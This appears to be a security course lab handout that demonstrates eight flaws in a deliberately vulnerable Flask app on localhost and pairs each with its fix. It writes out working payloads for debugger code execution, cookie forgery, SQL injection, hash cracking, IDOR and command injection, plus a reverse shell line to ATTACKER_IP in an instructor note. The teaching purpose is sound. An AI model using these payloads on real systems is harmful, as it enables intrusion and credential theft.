**Stage 2 --- Exploit the Flaws (30 minutes)**

Start the vulnerable application on your VM and use Firefox and ZAP to
demonstrate each flaw in action. You should have both the source code
and the running app visible simultaneously.

+-----------------------------------------------------------------------+
| **⚙️ Starting the app**                                               |
|                                                                       |
| cd \~/vuln_flask_app/module4_owasp_bingo                              |
|                                                                       |
| pip3 install flask \--break-system-packages                           |
|                                                                       |
| python3 vulnerable_shop.py                                            |
|                                                                       |
| Open Firefox and navigate to: http://localhost:5000                   |
+-----------------------------------------------------------------------+

**Flaws 1 & 2 --- Weak Secret Key & Debug Mode**

These two flaws are in the application configuration --- before any
route is defined. They are particularly dangerous because they are
invisible to users and often introduced by developers who intend to
\"fix them before production.\"

+-----------------------------------------------------------------------+
| **Exploit A --- Trigger the Werkzeug Interactive Debugger (Flaw 2)**  |
|                                                                       |
| 1\. With the app running, visit: http://localhost:5000/crash_demo     |
|                                                                       |
| (This route does not exist --- Flask will raise a 404 error)          |
|                                                                       |
| 2\. With DEBUG=True, Flask shows the Werkzeug debugger instead of a   |
| plain error page.                                                     |
|                                                                       |
| 3\. Click the terminal icon on any stack frame line.                  |
|                                                                       |
| 4\. Type Python code in the console: import os;                       |
| os.listdir(\"/home/ubuntu\")                                          |
|                                                                       |
| 5\. You now have arbitrary code execution in the server process.      |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > http://localhost:5000/profile?user_id=999 (triggers a DB miss →     |
| > exception → debugger)                                               |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *Werkzeug interactive Python console opens. Any Python command      |
| > executes with the server\'s privileges.*                            |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **Exploit B --- Forge a Session Cookie Using the Known Secret Key     |
| (Flaw 1)**                                                            |
|                                                                       |
| 1\. Open a terminal and install flask: pip3 install flask             |
| \--break-system-packages                                              |
|                                                                       |
| 2\. Run the following Python snippet to forge an admin session        |
| cookie:                                                               |
|                                                                       |
| from flask.sessions import SecureCookieSessionInterface               |
|                                                                       |
| from flask import Flask                                               |
|                                                                       |
| app = Flask(\_\_name\_\_)                                             |
|                                                                       |
| app.secret_key = \"password\" \# The key we read from the source      |
|                                                                       |
| si = app.session_interface                                            |
|                                                                       |
| session = si.open_session(app, None)                                  |
|                                                                       |
| session\[\"user\"\] = \"admin\"                                       |
|                                                                       |
| session\[\"role\"\] = \"admin\"                                       |
|                                                                       |
| \# Serialise to get the cookie value                                  |
|                                                                       |
| \# (use flask-unsign: pip3 install flask-unsign)                      |
|                                                                       |
| Shortcut using flask-unsign:                                          |
|                                                                       |
| flask-unsign \--sign \--cookie \'{\"role\": \"admin\", \"user\":      |
| \"admin\"}\' \--secret password                                       |
|                                                                       |
| 3\. Copy the output cookie value.                                     |
|                                                                       |
| 4\. In Firefox DevTools → Storage → Cookies → set \"session\" to the  |
| forged value.                                                         |
|                                                                       |
| 5\. Visit http://localhost:5000/admin --- you are now admin without   |
| any credentials.                                                      |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > flask-unsign \--sign \--cookie                                      |
| > \'{\"role\":\"admin\",\"user\":\"admin\"}\' \--secret password      |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *The /admin panel loads and shows all user records including        |
| > password hashes.*                                                   |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **✓ Fix 1: Secret key from environment variable**                     |
|                                                                       |
| app.secret_key = os.environ\[\"FLASK_SECRET_KEY\"\] --- the key never |
| appears in source code. Without the key, session cookies cannot be    |
| forged. Fix 2: app.config\[\"DEBUG\"\] =                              |
| os.environ.get(\"FLASK_DEBUG\", \"false\").lower() == \"true\" ---    |
| debug mode only activates if explicitly enabled via an environment    |
| variable that should never be set in production.                      |
+-----------------------------------------------------------------------+

**Flaws 3 & 4 --- MD5 Password Hashing & SQL Injection**

Both flaws live in the login() function. Flaw 4 is particularly powerful
because it bypasses authentication entirely --- the password hash is
never even computed.

+-----------------------------------------------------------------------+
| **Exploit C --- SQL Injection: Login Bypass (Flaw 4)**                |
|                                                                       |
| 1\. Go to: http://localhost:5000/login                                |
|                                                                       |
| 2\. In the Username field enter the payload below.                    |
|                                                                       |
| 3\. In the Password field enter anything (e.g. \"x\").                |
|                                                                       |
| 4\. Click Login.                                                      |
|                                                                       |
| The resulting SQL becomes:                                            |
|                                                                       |
| SELECT \* FROM users WHERE username=\'admin\' \--\' AND               |
| password_hash=\'\...\'                                                |
|                                                                       |
| The \-- starts a SQL comment, which discards the password check       |
| entirely.                                                             |
|                                                                       |
| The query matches the admin row and logs you in as admin with no      |
| valid password.                                                       |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > admin\' \--                                                         |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *You are logged in as admin. The page says \'Logout (admin)\'. No   |
| > correct password was needed.*                                       |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **Exploit D --- SQL Injection via Search: Extract User Table (Flaw    |
| 4)**                                                                  |
|                                                                       |
| 1\. Go to: http://localhost:5000/search                               |
|                                                                       |
| 2\. Enter the payload below into the search box.                      |
|                                                                       |
| 3\. The product search returns columns from the USERS table instead.  |
|                                                                       |
| This is a UNION-based injection: the attacker adds a second SELECT    |
| that                                                                  |
|                                                                       |
| returns data from a completely different table.                       |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > %\' UNION SELECT id, username, password_hash, role, email FROM      |
| > users \--                                                           |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *The search results now show all usernames, bcrypt hashes, roles    |
| > and emails from the users table.*                                   |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **Exploit E --- Crack the MD5 Hashes with HashCat (Flaw 3)**          |
|                                                                       |
| 1\. From the IDOR or SQLi output, extract the password_hash column.   |
|                                                                       |
| admin: 7f004cb8bab7e3df07ad56a5f8d4e0f8                               |
|                                                                       |
| alice: 482c811da5d5b4bc6d497ffa98491e38                               |
|                                                                       |
| bob: d8578edf8458ce06fbc5bb76a58c5ca4                                 |
|                                                                       |
| 2\. Save to a file: echo \"7f004cb8bab7e3df07ad56a5f8d4e0f8\" \>      |
| hashes.txt                                                            |
|                                                                       |
| 3\. Run HashCat against rockyou.txt:                                  |
|                                                                       |
| hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt              |
|                                                                       |
| 4\. All three passwords crack in under 1 second.                      |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt            |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *Passwords: letmein / password123 / qwerty --- cracked in seconds.* |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **✓ Fix 3 & 4: bcrypt + parameterised queries**                       |
|                                                                       |
| Fix 3: bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))    |
| --- bcrypt is designed to be slow. The same MD5 cracking run takes    |
| hours or days with bcrypt. Fix 4: db.execute(\"SELECT \* FROM users   |
| WHERE username = ?\", (username,)) --- the ? placeholder passes the   |
| value as data, never as SQL syntax. No matter what the user types, it |
| cannot alter the query structure.                                     |
+-----------------------------------------------------------------------+

**Flaw 5 --- Session Stores Username Instead of User ID**

This flaw interacts with Flaw 1. When the secret key is weak, the
combination means an attacker can forge a session cookie for any
username they choose --- including admin --- without needing to know
that user\'s password or even that user\'s ID.

+-----------------------------------------------------------------------+
| **Exploit F --- Privilege Escalation via Session Manipulation (Flaw   |
| 5)**                                                                  |
|                                                                       |
| 1\. Log in normally as alice (alice / password123).                   |
|                                                                       |
| 2\. Open Firefox DevTools → Application → Cookies.                    |
|                                                                       |
| 3\. Copy the value of the \"session\" cookie.                         |
|                                                                       |
| 4\. Decode it: flask-unsign \--decode \--cookie \"\<paste cookie      |
| here\>\"                                                              |
|                                                                       |
| You will see: {\"user\": \"alice\", \"role\": \"user\", \"\_fresh\":  |
| true}                                                                 |
|                                                                       |
| 5\. Re-sign with role=admin:                                          |
|                                                                       |
| flask-unsign \--sign \--cookie                                        |
| \'{\"user\":\"alice\",\"role\":\"admin\"}\' \--secret password        |
|                                                                       |
| 6\. Paste the new cookie value back into DevTools.                    |
|                                                                       |
| 7\. Visit /admin --- alice now has admin access.                      |
|                                                                       |
| Even more powerful: substitute \"user\": \"admin\" to impersonate the |
| admin account entirely.                                               |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > flask-unsign \--sign \--cookie                                      |
| > \'{\"user\":\"alice\",\"role\":\"admin\"}\' \--secret password      |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *Alice\'s account now has admin role. /admin shows all user         |
| > records.*                                                           |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **✓ Fix 5: Store user_id in the session, re-fetch role from the DB**  |
|                                                                       |
| session\[\"user_id\"\] = row\[\"id\"\] --- an integer that cannot be  |
| changed by the user. The role is looked up from the database on every |
| request using get_current_user(), which queries by user_id. Even if   |
| an attacker could forge the session, they could only set a user_id    |
| --- and the DB lookup for that ID returns the correct, unmodified     |
| role.                                                                 |
+-----------------------------------------------------------------------+

**Flaws 6 & 7 --- Missing Authentication & IDOR**

These two flaws combine: not only can any visitor access the /profile
route without logging in, but once there they can read any user\'s data
--- including password hashes --- simply by changing a number in the
URL.

+-----------------------------------------------------------------------+
| **Exploit G --- Unauthenticated IDOR: Read Any User Profile (Flaws 6  |
| & 7)**                                                                |
|                                                                       |
| 1\. Make sure you are logged OUT (visit /logout).                     |
|                                                                       |
| 2\. Visit: http://localhost:5000/profile?user_id=1                    |
|                                                                       |
| You see the admin account, including their password hash.             |
|                                                                       |
| 3\. Change to user_id=2, then user_id=3.                              |
|                                                                       |
| 4\. You can enumerate every user account without any authentication.  |
|                                                                       |
| 5\. Combine with HashCat to crack the MD5 hashes offline.             |
|                                                                       |
| Notice: no login was required at any point in this process.           |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > http://localhost:5000/profile?user_id=1 → then 2 → then 3           |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *All three user records returned including password_hash, email,    |
| > full_name and role --- no login required.*                          |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **✓ Fix 6 & 7: \@login_required decorator + load profile from         |
| session**                                                             |
|                                                                       |
| Fix 6: \@login_required on the route redirects any unauthenticated    |
| request to /login. Fix 7: The profile route no longer accepts a       |
| user_id parameter at all. It calls get_current_user() which loads the |
| record for session\[\"user_id\"\] only. Alice can never see Bob\'s    |
| profile --- even if she is authenticated.                             |
+-----------------------------------------------------------------------+

**Flaw 8 --- Command Injection via os.popen()**

This is the most severe flaw in the application. The /ping tool passes
user input directly to a shell command. Because os.popen() invokes
/bin/sh, the shell interprets metacharacters --- allowing an attacker to
run arbitrary system commands.

+-----------------------------------------------------------------------+
| **Exploit H --- Command Injection: Read Sensitive Files (Flaw 8)**    |
|                                                                       |
| 1\. Visit: http://localhost:5000/ping                                 |
|                                                                       |
| 2\. Enter the payload below in the host field.                        |
|                                                                       |
| 3\. The ; character ends the ping command and starts a new shell      |
| command.                                                              |
|                                                                       |
| 4\. Try progressively more powerful payloads:                         |
|                                                                       |
| 127.0.0.1; id                                                         |
|                                                                       |
| 127.0.0.1; whoami                                                     |
|                                                                       |
| 127.0.0.1; cat /etc/passwd                                            |
|                                                                       |
| 127.0.0.1; ls -la /home/ubuntu                                        |
|                                                                       |
| 127.0.0.1; cat shop.db \| base64                                      |
|                                                                       |
| 5\. The last payload exfiltrates the entire SQLite database.          |
|                                                                       |
| In a real attack, the & operator could establish a reverse shell.     |
|                                                                       |
| **Payload:**                                                          |
|                                                                       |
| > 127.0.0.1; cat /etc/passwd                                          |
|                                                                       |
| **Expected result:**                                                  |
|                                                                       |
| > *The /etc/passwd file contents are displayed in the browser below   |
| > the ping output.*                                                   |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **⚠️ Instructor note --- stop here before the reverse shell payload** |
|                                                                       |
| The payload 127.0.0.1; bash -i \>& /dev/tcp/ATTACKER_IP/4444 0\>&1    |
| would establish a                                                     |
|                                                                       |
| reverse shell from the VM to any listener. Demonstrate the concept by |
| showing the command                                                   |
|                                                                       |
| without executing it, to keep the exercise within the closed lab      |
| boundary.                                                             |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
| **✓ Fix 8: Input allowlist + subprocess with shell=False**            |
|                                                                       |
| Fix 8a: re.fullmatch(r\"\[a-zA-Z0-9.\\-\]{1,253}\", host) --- rejects |
| any input containing shell metacharacters before the command is       |
| constructed. Fix 8b: subprocess.run(\[\"ping\", \"-c\", \"2\",        |
| host\], shell=False) --- passes the command as a list of strings      |
| directly to the OS. No shell is invoked, so no shell metacharacters   |
| are interpreted --- even if the allowlist were somehow bypassed.      |
+-----------------------------------------------------------------------+

**Stage 3 --- Compare the Fixed Version (10 minutes)**

Open vulnerable_shop_fixed.py alongside vulnerable_shop.py. For each of
the 8 flaws, find the corresponding fix and read the inline comment that
explains it.

Suggested diff command --- run in a terminal on your VM:

> diff \--side-by-side \--width=220 vulnerable_shop.py
> vulnerable_shop_fixed.py \| less -S

Or use VS Code\'s built-in diff view:

> code \--diff vulnerable_shop.py vulnerable_shop_fixed.py

+-----------------------------------------------------------------------+
| **🎯 Key observation**                                                |
|                                                                       |
| Count the lines that changed between the two files.                   |
|                                                                       |
| The security improvement is significant --- but the number of changed |
| lines is surprisingly small.                                          |
|                                                                       |
| This illustrates that secure coding is not about writing more code;   |
| it\'s about making                                                    |
|                                                                       |
| different choices at specific, identifiable decision points.          |
+-----------------------------------------------------------------------+

